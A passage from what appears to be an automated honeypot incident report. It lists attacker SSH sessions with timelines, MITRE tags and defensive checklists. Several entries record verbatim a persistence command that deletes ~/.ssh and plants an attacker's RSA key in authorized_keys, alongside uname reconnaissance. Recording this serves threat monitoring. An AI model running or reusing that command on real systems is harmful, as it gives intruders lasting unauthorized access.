| `2026-06-10 04:04:07` | `cowrie.log.closed` |
| `2026-06-10 04:04:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.77[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.154.77[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-959e634b076f

| Field | Detail |
|---|---|
| **Source IP** | `103.154.77[.]48` |
| **First Seen** | 2026-06-10 04:04 |
| **Last Seen** | 2026-06-10 04:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:04:09` | `cowrie.session.connect` |
| `2026-06-10 04:04:09` | `cowrie.client.version` |
| `2026-06-10 04:04:09` | `cowrie.client.kex` |
| `2026-06-10 04:04:09` | `cowrie.login.success` |
| `2026-06-10 04:04:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.77[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.154.77[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f21d6d2a3071

| Field | Detail |
|---|---|
| **Source IP** | `24.199.122[.]229` |
| **First Seen** | 2026-06-10 04:07 |
| **Last Seen** | 2026-06-10 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:07:37` | `cowrie.session.connect` |
| `2026-06-10 04:07:37` | `cowrie.client.version` |
| `2026-06-10 04:07:37` | `cowrie.client.kex` |
| `2026-06-10 04:07:38` | `cowrie.login.success` |
| `2026-06-10 04:07:38` | `cowrie.session.params` |
| `2026-06-10 04:07:38` | `cowrie.command.input` |
| `2026-06-10 04:07:39` | `cowrie.log.closed` |
| `2026-06-10 04:07:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.199.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `24.199.122[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a44a93b576bb

| Field | Detail |
|---|---|
| **Source IP** | `103.154.77[.]48` |
| **First Seen** | 2026-06-10 04:07 |
| **Last Seen** | 2026-06-10 04:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:07:57` | `cowrie.session.connect` |
| `2026-06-10 04:07:57` | `cowrie.client.version` |
| `2026-06-10 04:07:57` | `cowrie.client.kex` |
| `2026-06-10 04:07:58` | `cowrie.login.success` |
| `2026-06-10 04:07:58` | `cowrie.session.params` |
| `2026-06-10 04:07:58` | `cowrie.command.input` |
| `2026-06-10 04:07:58` | `cowrie.command.failed` |
| `2026-06-10 04:07:58` | `cowrie.log.closed` |
| `2026-06-10 04:07:58` | `cowrie.session.params` |
| `2026-06-10 04:07:58` | `cowrie.command.input` |
| `2026-06-10 04:07:58` | `cowrie.session.file_download` |
| `2026-06-10 04:07:58` | `cowrie.log.closed` |
| `2026-06-10 04:08:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.77[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.154.77[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2ad2a181b33

| Field | Detail |
|---|---|
| **Source IP** | `103.154.77[.]48` |
| **First Seen** | 2026-06-10 04:08 |
| **Last Seen** | 2026-06-10 04:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:08:00` | `cowrie.session.connect` |
| `2026-06-10 04:08:00` | `cowrie.client.version` |
| `2026-06-10 04:08:00` | `cowrie.client.kex` |
| `2026-06-10 04:08:01` | `cowrie.login.success` |
| `2026-06-10 04:08:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.77[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.154.77[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d11dc8936822

| Field | Detail |
|---|---|
| **Source IP** | `24.199.122[.]229` |
| **First Seen** | 2026-06-10 04:08 |
| **Last Seen** | 2026-06-10 04:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:08:04` | `cowrie.session.connect` |
| `2026-06-10 04:08:04` | `cowrie.client.version` |
| `2026-06-10 04:08:05` | `cowrie.client.kex` |
| `2026-06-10 04:08:05` | `cowrie.login.success` |
| `2026-06-10 04:08:06` | `cowrie.session.params` |
| `2026-06-10 04:08:06` | `cowrie.command.input` |
| `2026-06-10 04:08:06` | `cowrie.log.closed` |
| `2026-06-10 04:08:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.199.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `24.199.122[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-172171f0f65c

| Field | Detail |
|---|---|
| **Source IP** | `24.199.122[.]229` |
| **First Seen** | 2026-06-10 04:08 |
| **Last Seen** | 2026-06-10 04:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:08:07` | `cowrie.session.connect` |
| `2026-06-10 04:08:07` | `cowrie.client.version` |
| `2026-06-10 04:08:07` | `cowrie.client.kex` |
| `2026-06-10 04:08:08` | `cowrie.login.success` |
| `2026-06-10 04:08:09` | `cowrie.session.params` |
| `2026-06-10 04:08:09` | `cowrie.command.input` |
| `2026-06-10 04:08:09` | `cowrie.log.closed` |
| `2026-06-10 04:08:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.199.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `24.199.122[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2675e70058a0

| Field | Detail |
|---|---|
| **Source IP** | `103.154.77[.]48` |
| **First Seen** | 2026-06-10 04:09 |
| **Last Seen** | 2026-06-10 04:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:09:55` | `cowrie.session.connect` |
| `2026-06-10 04:09:55` | `cowrie.client.version` |
| `2026-06-10 04:09:55` | `cowrie.client.kex` |
| `2026-06-10 04:09:56` | `cowrie.login.success` |
| `2026-06-10 04:09:56` | `cowrie.session.params` |
| `2026-06-10 04:09:56` | `cowrie.command.input` |
| `2026-06-10 04:09:56` | `cowrie.command.failed` |
| `2026-06-10 04:09:56` | `cowrie.log.closed` |
| `2026-06-10 04:09:56` | `cowrie.session.params` |
| `2026-06-10 04:09:56` | `cowrie.command.input` |
| `2026-06-10 04:09:56` | `cowrie.session.file_download` |
| `2026-06-10 04:09:56` | `cowrie.log.closed` |
| `2026-06-10 04:09:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.77[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.154.77[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bcc68612695

| Field | Detail |
|---|---|
| **Source IP** | `103.154.77[.]48` |
| **First Seen** | 2026-06-10 04:09 |
| **Last Seen** | 2026-06-10 04:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:09:58` | `cowrie.session.connect` |
| `2026-06-10 04:09:58` | `cowrie.client.version` |
| `2026-06-10 04:09:58` | `cowrie.client.kex` |
| `2026-06-10 04:09:59` | `cowrie.login.success` |
| `2026-06-10 04:09:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.77[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.154.77[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4615da7c4247

| Field | Detail |
|---|---|
| **Source IP** | `103.154.77[.]48` |
| **First Seen** | 2026-06-10 04:13 |
| **Last Seen** | 2026-06-10 04:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:13:44` | `cowrie.session.connect` |
| `2026-06-10 04:13:44` | `cowrie.client.version` |
| `2026-06-10 04:13:44` | `cowrie.client.kex` |
| `2026-06-10 04:13:44` | `cowrie.login.success` |
| `2026-06-10 04:13:45` | `cowrie.session.params` |
| `2026-06-10 04:13:45` | `cowrie.command.input` |
| `2026-06-10 04:13:45` | `cowrie.command.failed` |
| `2026-06-10 04:13:45` | `cowrie.log.closed` |
| `2026-06-10 04:13:45` | `cowrie.session.params` |
| `2026-06-10 04:13:45` | `cowrie.command.input` |
| `2026-06-10 04:13:45` | `cowrie.session.file_download` |
| `2026-06-10 04:13:45` | `cowrie.log.closed` |
| `2026-06-10 04:13:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.77[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.154.77[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e73a0bbc6875

| Field | Detail |
|---|---|
| **Source IP** | `103.154.77[.]48` |
| **First Seen** | 2026-06-10 04:13 |
| **Last Seen** | 2026-06-10 04:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:13:47` | `cowrie.session.connect` |
| `2026-06-10 04:13:47` | `cowrie.client.version` |
| `2026-06-10 04:13:47` | `cowrie.client.kex` |
| `2026-06-10 04:13:47` | `cowrie.login.success` |
| `2026-06-10 04:13:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.77[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.154.77[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4a37a5b65e9

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-06-10 04:17 |
| **Last Seen** | 2026-06-10 04:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:17:16` | `cowrie.session.connect` |
| `2026-06-10 04:17:16` | `cowrie.client.version` |
| `2026-06-10 04:17:17` | `cowrie.client.kex` |
| `2026-06-10 04:17:18` | `cowrie.login.success` |
| `2026-06-10 04:17:19` | `cowrie.session.params` |
| `2026-06-10 04:17:19` | `cowrie.command.input` |
| `2026-06-10 04:17:19` | `cowrie.command.failed` |
| `2026-06-10 04:17:19` | `cowrie.log.closed` |
| `2026-06-10 04:17:20` | `cowrie.session.params` |
| `2026-06-10 04:17:20` | `cowrie.command.input` |
| `2026-06-10 04:17:20` | `cowrie.session.file_download` |
| `2026-06-10 04:17:20` | `cowrie.log.closed` |
| `2026-06-10 04:17:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b610ec5c063

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-06-10 04:17 |
| **Last Seen** | 2026-06-10 04:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:17:23` | `cowrie.session.connect` |
| `2026-06-10 04:17:23` | `cowrie.client.version` |
| `2026-06-10 04:17:24` | `cowrie.client.kex` |
| `2026-06-10 04:17:25` | `cowrie.login.success` |
| `2026-06-10 04:17:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83e0484b709d

| Field | Detail |
|---|---|
| **Source IP** | `103.154.77[.]48` |
| **First Seen** | 2026-06-10 04:17 |
| **Last Seen** | 2026-06-10 04:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:17:33` | `cowrie.session.connect` |
| `2026-06-10 04:17:33` | `cowrie.client.version` |
| `2026-06-10 04:17:33` | `cowrie.client.kex` |
| `2026-06-10 04:17:33` | `cowrie.login.success` |
| `2026-06-10 04:17:34` | `cowrie.session.params` |
| `2026-06-10 04:17:34` | `cowrie.command.input` |
| `2026-06-10 04:17:34` | `cowrie.command.failed` |
| `2026-06-10 04:17:34` | `cowrie.log.closed` |
| `2026-06-10 04:17:34` | `cowrie.session.params` |
| `2026-06-10 04:17:34` | `cowrie.command.input` |
| `2026-06-10 04:17:34` | `cowrie.session.file_download` |
| `2026-06-10 04:17:34` | `cowrie.log.closed` |
| `2026-06-10 04:17:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.77[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.154.77[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41446c4e28a1

| Field | Detail |
|---|---|
| **Source IP** | `103.154.77[.]48` |
| **First Seen** | 2026-06-10 04:17 |
| **Last Seen** | 2026-06-10 04:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:17:36` | `cowrie.session.connect` |
| `2026-06-10 04:17:36` | `cowrie.client.version` |
| `2026-06-10 04:17:36` | `cowrie.client.kex` |
| `2026-06-10 04:17:36` | `cowrie.login.success` |
| `2026-06-10 04:17:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.77[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.154.77[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c8f59f7f907

| Field | Detail |
|---|---|
| **Source IP** | `103.154.77[.]48` |
| **First Seen** | 2026-06-10 04:19 |
| **Last Seen** | 2026-06-10 04:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:19:27` | `cowrie.session.connect` |
| `2026-06-10 04:19:27` | `cowrie.client.version` |
| `2026-06-10 04:19:27` | `cowrie.client.kex` |
| `2026-06-10 04:19:27` | `cowrie.login.success` |
| `2026-06-10 04:19:27` | `cowrie.session.params` |
| `2026-06-10 04:19:27` | `cowrie.command.input` |
| `2026-06-10 04:19:27` | `cowrie.command.failed` |
| `2026-06-10 04:19:28` | `cowrie.log.closed` |
| `2026-06-10 04:19:28` | `cowrie.session.params` |
| `2026-06-10 04:19:28` | `cowrie.command.input` |
| `2026-06-10 04:19:28` | `cowrie.session.file_download` |
| `2026-06-10 04:19:28` | `cowrie.log.closed` |
| `2026-06-10 04:19:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.77[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.154.77[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a54bf44a8284

| Field | Detail |
|---|---|
| **Source IP** | `103.154.77[.]48` |
| **First Seen** | 2026-06-10 04:19 |
| **Last Seen** | 2026-06-10 04:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:19:30` | `cowrie.session.connect` |
| `2026-06-10 04:19:30` | `cowrie.client.version` |
| `2026-06-10 04:19:30` | `cowrie.client.kex` |
| `2026-06-10 04:19:30` | `cowrie.login.success` |
| `2026-06-10 04:19:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.77[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.154.77[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-130ed4613ab0

| Field | Detail |
|---|---|
| **Source IP** | `103.154.77[.]48` |
| **First Seen** | 2026-06-10 04:22 |
| **Last Seen** | 2026-06-10 04:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:22:15` | `cowrie.session.connect` |
| `2026-06-10 04:22:15` | `cowrie.client.version` |
| `2026-06-10 04:22:15` | `cowrie.client.kex` |
| `2026-06-10 04:22:15` | `cowrie.login.success` |
| `2026-06-10 04:22:15` | `cowrie.session.params` |
| `2026-06-10 04:22:15` | `cowrie.command.input` |
| `2026-06-10 04:22:15` | `cowrie.command.failed` |
| `2026-06-10 04:22:16` | `cowrie.log.closed` |
| `2026-06-10 04:22:16` | `cowrie.session.params` |
| `2026-06-10 04:22:16` | `cowrie.command.input` |
| `2026-06-10 04:22:16` | `cowrie.session.file_download` |
| `2026-06-10 04:22:16` | `cowrie.log.closed` |
| `2026-06-10 04:22:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.77[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.154.77[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-212463c38d25

| Field | Detail |
|---|---|
| **Source IP** | `103.154.77[.]48` |
| **First Seen** | 2026-06-10 04:22 |
| **Last Seen** | 2026-06-10 04:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:22:17` | `cowrie.session.connect` |
| `2026-06-10 04:22:17` | `cowrie.client.version` |
| `2026-06-10 04:22:18` | `cowrie.client.kex` |
| `2026-06-10 04:22:18` | `cowrie.login.success` |
| `2026-06-10 04:22:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.77[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.154.77[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43f131943c7c

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-10 04:33 |
| **Last Seen** | 2026-06-10 04:34 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
